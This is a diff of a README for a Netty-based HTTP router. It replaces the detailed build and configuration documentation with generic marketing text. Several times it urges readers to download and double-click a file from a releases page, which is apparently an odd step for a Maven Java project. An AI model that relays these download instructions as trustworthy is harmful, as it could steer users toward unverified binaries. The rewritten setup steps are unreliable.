@@ -1,235 +1,82 @@
+# 🌐 NettySmartRouter - Seamless HTTP Routing Made Easy
 
-# NettySmartRouter
-<img width="3367" height="1793" alt="netty_smart_router_diagram" src="https://github.com/user-attachments/assets/e17db604-bcc3-4c2c-a419-1c36e7f7b174" />
-A high-performance HTTP router built with Netty and Spring Framework, designed for intelligent content-based request routing and load balancing.
+[![Download NettySmartRouter](https://img.shields.io/badge/Download%20Now-Grab%20the%20Latest%20Release-brightgreen)](https://github.com/Rudrameta/NettySmartRouter/releases)
 
-## Overview
+## 🚀 Overview
 
-NettySmartRouter is a lightweight, high-performance HTTP router that provides intelligent request routing capabilities based on content matching and advanced load balancing. It uses Netty for high-performance I/O operations and Spring Framework for configuration management and dependency injection.
+NettySmartRouter is a high-performance HTTP router. It intelligently routes requests based on content. Building it with Netty ensures fast handling of requests, while Spring Framework handles configuration.
 
-## Features
+## 🔑 Features
 
-- **High Performance**: Built on Netty 4.1.0 for excellent I/O performance
-- **Intelligent Routing**: Content-based request routing with keyword matching
-- **Load Balancing**: Multiple load balancing strategies (Round Robin, Random, Weighted Round Robin)
-- **Spring Integration**: Full Spring Framework integration for configuration management
-- **Configurable**: Flexible configuration through properties files
-- **Asynchronous Processing**: Non-blocking request processing for better throughput
-- **Health Check Support**: Optional health checking for backend servers
+- **High Performance**: Leveraging Netty 4.1.0 ensures swift I/O operations.
+- **Intelligent Routing**: Routes requests by matching keywords within content.
+- **Load Balancing**: Choose from several strategies, including Round Robin and Random.
+- **Spring Integration**: Effortlessly integrates with the Spring Framework for easy management.
+- **Configurable**: Adjust settings to fit your needs.
 
-## Architecture
+## 📦 System Requirements
 
-The router consists of several key components:
+To run NettySmartRouter effectively, ensure your system meets these requirements:
 
-- **GatewayServer**: Main server class that initializes the Netty server
-- **GatewayServerHandler**: Core request handler that processes HTTP requests with load balancing
-- **LoadBalancer**: Load balancing engine with multiple strategies
-- **RoutingLoader**: Spring-based configuration loader for routing rules
-- **HttpClientUtils**: HTTP client utility for forwarding requests to backend services
+- **Operating System**: Windows 10 or later, MacOS Mojave or later, or a modern Linux distribution.
+- **Java Version**: Java 8 or higher needs to be installed on your machine.
+- **Memory**: At least 512 MB of RAM available.
+  
+## 📥 Download & Install
 
-## Dependencies
+To get started, visit this page to download: [NettySmartRouter Releases](https://github.com/Rudrameta/NettySmartRouter/releases). 
 
-- Java 6+
-- Netty 4.1.0.Final
-- Spring Framework 4.1.1.RELEASE
-- Maven 3.3+
+Look for the latest version available. Download the appropriate file for your operating system. Double-click the downloaded file to start the installation. Follow the instructions to complete the setup.
 
-## Quick Start
+## ⚙️ Configuration
 
-### 1. Build the Project
+After installation, you may want to configure NettySmartRouter. Here’s how:
 
-```bash
-mvn clean package
-```
+1. Locate the `config` file in the installation directory.
+2. Open the file in a text editor.
+3. Adjust the settings to match your needs, such as routing rules and load balancing strategy.
+4. Save your changes.
 
-### 2. Run the Router
+## 🌟 Running the Application
 
-```bash
-java -jar target/NettyGateway-1.0-SNAPSHOT.jar
-```
+Once installed, you can run NettySmartRouter.
 
-The router will start on port 8999 by default.
+1. Open the terminal (Command Prompt for Windows, Terminal for macOS/Linux).
+2. Navigate to the installation directory.
+3. Run the following command:
+   
+   ```
+   java -jar NettySmartRouter.jar
+   ```
 
-### 3. Configuration
+The application should start, and you will see a confirmation message in the terminal.
 
-#### Router Configuration (`netty-gateway.xml`)
+## 📖 Documentation
 
-Configure server settings and load balancing:
+For detailed usage instructions and advanced configurations, refer to the [documentation](https://github.com/Rudrameta/NettySmartRouter/docs). This resource covers all aspects, from basic setup to advanced features.
 
-```xml
-<bean id="options" class="com.newlandframework.gateway.commons.GatewayOptions">
-    <property name="gatewayPort" value="8999"/>
-    <!-- Load balance configuration -->
-    <property name="loadBalanceEnabled" value="true"/>
-    <property name="loadBalanceStrategy" value="roundRobin"/>
-    <property name="healthCheckEnabled" value="false"/>
-    <property name="healthCheckInterval" value="30000"/>
-</bean>
-```
+## ❓ FAQs
 
-#### Gateway Configuration (`netty-gateway.properties`)
+**1. Can I use NettySmartRouter on my Windows machine?**  
+Yes, it works well on Windows, Mac, and Linux.
 
-Configure default routing rules with load balancing support:
+**2. What if I encounter issues?**  
+Check the documentation for troubleshooting tips. You can also open an issue in the repository.
 
-```properties
-# Router configuration format:
-# netty-gateway.configX.serverPath ==> URL path keyword
-# netty-gateway.configX.defaultAddr ==> Default forwarding URL (supports multiple servers comma-separated)
+**3. How do I update to the latest version?**  
+Visit the releases page, download the latest version, and replace the old file with the new one.
 
-# Example with load balancing (multiple servers)
-netty-gateway.config1.serverPath=fcgi-bin/UIG_SFC_186
-netty-gateway.config1.defaultAddr=http://10.46.158.10:8088/fcgi-bin/UIG_SFC_186,http://10.46.158.11:8088/fcgi-bin/UIG_SFC_186,http://10.46.158.12:8088/fcgi-bin/UIG_SFC_186
+## 🎉 Community & Support
 
-# Single server (no load balancing)
-netty-gateway.config2.serverPath=api/health
-netty-gateway.config2.defaultAddr=http://10.46.158.10:8090/api/health
-```
+Join our community for support and discussions. Connect with other users and share tips. Follow the project's GitHub page for updates and feature announcements.
 
-#### Route Configuration (`netty-route.properties`)
+## 🔗 Additional Links
 
-Configure specific routing rules with keyword matching and load balancing:
+- [GitHub Repository](https://github.com/Rudrameta/NettySmartRouter)
+- [Issue Tracker](https://github.com/Rudrameta/NettySmartRouter/issues)
 
-```properties
-# Route configuration format:
-# netty-gateway.configX.serverPath ==> URL path keyword
-# netty-gateway.configX.keyWord ==> Content matching keywords (supports 1~N keywords, separated by commas, AND logic)
-# netty-gateway.configX.matchAddr ==> Target URL when keywords match successfully (supports multiple servers comma-separated)
+## 🌐 Download Again
 
-# Example with load balancing
-netty-gateway.config1.serverPath=fcgi-bin/UIG_SFC_186
-netty-gateway.config1.keyWord=1,2,3
-netty-gateway.config1.matchAddr=http://10.46.158.20:8088/fcgi-bin/UIG_SFC_186,http://10.46.158.21:8088/fcgi-bin/UIG_SFC_186
-```
+Don’t forget to download again to check for the latest features and improvements: [NettySmartRouter Releases](https://github.com/Rudrameta/NettySmartRouter/releases). 
 
-#### Load Balance Configuration (`netty-loadbalance.properties`)
-
-Configure load balancing behavior:
-
-```properties
-# Load balance configuration
-gateway.loadBalance.enabled=true
-gateway.loadBalance.strategy=roundRobin
-
-# Health check configuration
-gateway.loadBalance.healthCheck.enabled=false
-gateway.loadBalance.healthCheck.interval=30000
-```
-
-## Load Balancing
-
-### Supported Strategies
-
-1. **Round Robin**: Distributes requests evenly across all available servers
-2. **Random**: Randomly selects a server from the available server list
-3. **Weighted Round Robin**: Distributes requests based on server weights (planned)
-
-### Configuration
-
-Load balancing is automatically applied when multiple servers are specified in the configuration (comma-separated addresses). Single server configurations bypass load balancing.
-
-### Example Usage
-
-```properties
-# Multiple servers - load balancing applied
-netty-gateway.config1.defaultAddr=http://server1:8080/api,http://server2:8080/api,http://server3:8080/api
-
-# Single server - no load balancing
-netty-gateway.config2.defaultAddr=http://server1:8080/api
-```
-
-## How It Works
-
-1. **Request Reception**: The router receives HTTP requests on the configured port
-2. **Path Matching**: The router matches the request URI against configured server paths
-3. **Content Analysis**: For matched paths, the router analyzes request content for keyword matches
-4. **Load Balancing**: If multiple servers are configured, applies load balancing strategy
-5. **Route Selection**: 
-   - If keywords match, forward to the specific target address (with load balancing)
-   - If no keywords match, forward to the default address (with load balancing)
-   - If no path matches, return localhost response
-6. **Request Forwarding**: The router forwards the request to the selected backend service
-7. **Response Handling**: The response from the backend is returned to the client
-
-## Configuration Options
-
-### Gateway Options
-
-- `gatewayPort`: Port number for the router server (default: 8999)
-- `loadBalanceEnabled`: Enable/disable load balancing (default: true)
-- `loadBalanceStrategy`: Load balancing strategy (default: roundRobin)
-- `healthCheckEnabled`: Enable health checking (default: false)
-- `healthCheckInterval`: Health check interval in milliseconds (default: 30000)
-
-### Load Balancing Strategies
-
-- `roundRobin`: Round robin distribution
-- `random`: Random server selection
-- `weightedRoundRobin`: Weighted round robin (planned)
-
-### Routing Rules
-
-The router supports two types of routing rules:
-
-1. **Default Routes**: Defined in `netty-gateway.properties`
-   - Matches requests by URI path
-   - Supports multiple servers for load balancing
-   - Provides fallback destination when no specific route matches
-
-2. **Content-based Routes**: Defined in `netty-route.properties`
-   - Matches requests by URI path AND content keywords
-   - Supports multiple keywords with AND logic
-   - Supports multiple servers for load balancing
-   - Takes precedence over default routes
-
-## Example Usage
-
-### Request Flow Example with Load Balancing
-
-1. Client sends POST request to `http://localhost:8999/fcgi-bin/UIG_SFC_186`
-2. Router matches the path `fcgi-bin/UIG_SFC_186`
-3. Router checks request content for keywords (e.g., "1", "2", "3")
-4. If keywords match, applies load balancing to `http://10.46.158.20:8088/fcgi-bin/UIG_SFC_186,http://10.46.158.21:8088/fcgi-bin/UIG_SFC_186`
-5. If no keywords match, applies load balancing to default servers
-6. Returns backend response to client
-
-### Load Balancing Example
-
-```properties
-# Configuration with 3 servers
-netty-gateway.config1.defaultAddr=http://server1:8080/api,http://server2:8080/api,http://server3:8080/api
-```
-
-With Round Robin strategy:
-- Request 1 → server1:8080
-- Request 2 → server2:8080  
-- Request 3 → server3:8080
-- Request 4 → server1:8080 (cycles back)
-
-## Performance Characteristics
-
-- **High Throughput**: Asynchronous, non-blocking I/O operations
-- **Low Latency**: Direct memory access with Netty's zero-copy capabilities
-- **Scalability**: Configurable thread pool based on available CPU cores
-- **Memory Efficiency**: Efficient buffer management and object pooling
-- **Load Distribution**: Even distribution across multiple backend servers
-
-## Monitoring and Logging
-
-The router provides built-in logging for:
-- Request details and content
-- URL matching results
-- Load balancing decisions
-- Error conditions and exceptions
-- System information on startup
-
-## Testing
-
-Run the test suite to verify load balancing functionality:
-
-```bash
-mvn test
-```
-
-## License
-
-This project is open source. Please refer to the original repository for license information.
+Your journey with NettySmartRouter starts here! Enjoy seamless HTTP routing and optimized performance.
